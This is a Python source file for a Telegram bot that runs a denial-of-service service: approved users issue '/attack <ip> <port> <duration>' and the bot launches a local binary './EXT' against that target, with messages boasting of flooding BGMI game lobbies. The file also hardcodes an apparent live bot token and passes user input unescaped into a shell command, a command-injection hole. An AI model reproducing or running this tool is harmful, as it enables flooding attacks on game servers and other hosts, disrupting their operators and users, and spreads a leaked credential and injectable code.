import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()
TELEGRAM_BOT_TOKEN = '7283756422:AAHIHrM-NNxYweWyyQsOWu2Kk1r4yxOlHYc'
ADMIN_USER_ID = 7903853982
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🥀 𝐄𝐗𝐓𝐄𝐍𝐃𝐄𝐑 2.5 ™ 🥀*\n\n"
        "*🐰 𝐔𝐬𝐞 : /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> 🐰*\n"
        "*🍁 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐅𝐔𝐂𝐊 𝐁𝐆𝐌𝐈 🍁*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*📵 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐚𝐝𝐦𝐢𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /𝐦𝐚𝐧𝐚𝐠𝐞 <𝐚𝐝𝐝|𝐫𝐞𝐦> <𝐮𝐬𝐞𝐫_𝐢𝐝>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {𝐭𝐚𝐫𝐠𝐞𝐭_𝐮𝐬𝐞𝐫_𝐢𝐝} 𝐚𝐝𝐝𝐞𝐝 🥀.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝐔𝐬𝐞𝐫 {𝐭𝐚𝐫𝐠𝐞𝐭_𝐮𝐬𝐞𝐫_𝐢𝐝} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 🥀.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./EXT {ip} {port} {duration} 800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝐄𝐫𝐫𝐨𝐫 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝! ✅*\n*𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐮𝐬𝐢𝐧𝐠 𝐨𝐮𝐫 𝐒𝐀𝐕𝐈𝐓𝐄𝐑 𝐬𝐞𝐫𝐯𝐢𝐜𝐞!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🔥 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐛𝐞 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.🔥*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*📵 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.📵*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*🍁 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐚𝐮𝐧𝐜𝐡𝐞𝐝!*\n"
        f"*🍁 𝐓𝐚𝐫𝐠𝐞𝐭: {𝐢𝐩}:{𝐩𝐨𝐫𝐭}*\n"
        f"*🍁 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*\n"
        f"*🍁 𝐄𝐧𝐣𝐨𝐲 𝐀𝐧𝐝 𝐅𝐮𝐜𝐤 𝐖𝐡𝐨𝐥𝐞 𝐋𝐨𝐛𝐛𝐲*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
